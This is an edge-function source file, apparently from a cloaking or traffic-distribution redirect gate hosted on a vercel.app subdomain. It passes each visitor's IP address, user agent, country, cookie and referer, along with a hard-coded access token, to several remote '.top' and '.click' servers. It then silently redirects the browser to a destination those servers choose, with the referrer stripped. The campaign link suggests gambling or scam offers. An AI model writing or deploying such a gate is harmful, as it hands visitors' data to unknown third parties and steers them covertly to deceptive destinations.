export const config = { runtime: 'edge' };

const CFG = {"slots": {"play": "https://packz9k6ls4n.top/dSChDBVZ?sub_id_3=lucky-capone-237.vercel.app&sub_id_5=DDL"}, "go_urls": ["https://monitorre.top/go/ref", "https://firespot.click/go/ref", "https://fintechfox.click/go/ref", "https://buffout.click/go/ref"], "go_token": "6c27a2676e6fb97970145a1c9daa1d717ea137c80518a24c", "go_cookie": ""};
function clean(v){return (v||'').replace(/[\x00-\x1f\x7f]/g,'').trim();}
function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));const t=a[i];a[i]=a[j];a[j]=t;}return a;}
function allowed(dest,nodes,ref,site,fb){let p;try{p=new URL(dest);}catch(_){return false;}if(p.protocol!=='https:')return false;const h=p.hostname.toLowerCase();if(fb&&ref){let rh='';try{rh=new URL(ref).hostname.toLowerCase();}catch(_){}if(rh&&h===rh)return true;}const bad=[site];for(const n of nodes){try{bad.push(new URL(n).hostname.toLowerCase());}catch(_){}}try{if(ref)bad.push(new URL(ref).hostname.toLowerCase());}catch(_){}for(const b of bad){if(b&&(h===b||h.endsWith('.'+b)))return false;}return true;}
async function ask(url,headers,ms){const c=new AbortController();const t=setTimeout(()=>c.abort(),ms);let r;try{r=await fetch(url,{method:'GET',redirect:'manual',headers,signal:c.signal});}catch(_){throw{next:!c.signal.aborted};}finally{clearTimeout(t);}const s=r.status;if([521,522,523,525,526].includes(s))throw{next:true};const loc=r.headers.get('location')||'';if(s<300||s>399||!loc)throw{next:false};return{location:loc,cookie:r.headers.get('x-uniqueness-cookie')||'',maxAge:parseInt(r.headers.get('x-cookie-max-age')||'0',10)||0,fallback:(r.headers.get('x-ref-fallback')||'')==='1'};}
function unavailable(){return new Response('<!doctype html><meta charset=utf-8><title>Please try again</title><p style="font:16px/1.5 system-ui;margin:3rem auto;max-width:30rem;text-align:center">This link is temporarily unavailable. Please try again in a minute.</p>',{status:503,headers:{'content-type':'text/html; charset=utf-8','cache-control':'no-store'}});}
async function gate(request, slot){
  const ref=CFG.slots[slot];
  if(!ref)return new Response('Not Found',{status:404});
  const nodes=CFG.go_urls||[];if(!nodes.length)return unavailable();
  const u=new URL(request.url);const qs=new URLSearchParams();
  for(const [k,v] of u.searchParams){if(/^(utm_[a-z_]+|sub_id_\d+)$/.test(k))qs.set(k,v);}
  const suffix=qs.toString()?('?'+qs.toString()):'';
  const site=(request.headers.get('host')||u.hostname).toLowerCase().replace(/^www\./,'');
  const H={};const put=(n,x)=>{const c=clean(x);if(c)H[n]=c;};
  put('X-Request-Token',CFG.go_token);put('X-Request-Ref',ref);put('X-Request-Site',site);put('X-Request-Slot',slot);
  put('X-Visitor-IP',request.headers.get('cf-connecting-ip')||(request.headers.get('x-forwarded-for')||'').split(',')[0]);
  put('X-Visitor-UA',request.headers.get('user-agent'));put('X-Visitor-Lang',(request.headers.get('accept-language')||'').slice(0,5));
  put('X-Visitor-Country',request.headers.get('cf-ipcountry')||request.headers.get('x-vercel-ip-country'));
  const gc=CFG.go_cookie?((request.headers.get('cookie')||'').match(new RegExp('(?:^|;\\s*)'+CFG.go_cookie+'=([^;]+)'))):null;
  put('X-Visitor-Cookie',gc?gc[1]:'');put('X-Visitor-Referer',request.headers.get('referer'));
  let ans=null;
  for(const node of shuffle(nodes.slice())){try{ans=await ask(node+suffix,H,9000);break;}catch(e){if(e&&e.next)continue;return unavailable();}}
  if(!ans||!allowed(ans.location,nodes,ref,site,ans.fallback))return unavailable();
  const rh={'content-type':'text/html; charset=utf-8','cache-control':'no-store, private'};
  if(CFG.go_cookie&&ans.cookie){const s=ans.maxAge>0?ans.maxAge:86400;rh['set-cookie']=CFG.go_cookie+'='+ans.cookie+'; Path=/; Max-Age='+s+'; Secure; HttpOnly; SameSite=Lax';}
  const tgt=ans.location;const js=JSON.stringify(tgt);const ht=tgt.replace(/&/g,'&amp;').replace(/"/g,'&quot;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
  return new Response('<!doctype html><meta charset=utf-8><meta name=referrer content=no-referrer><title>…</title><script>location.replace('+js+')</script><noscript><a rel=noreferrer href="'+ht+'">Continue</a></noscript>',{status:200,headers:rh});
}

export default async function handler(request){const slot=(new URL(request.url).pathname.split('/').filter(Boolean).pop()||'').toLowerCase();return gate(request, slot);}
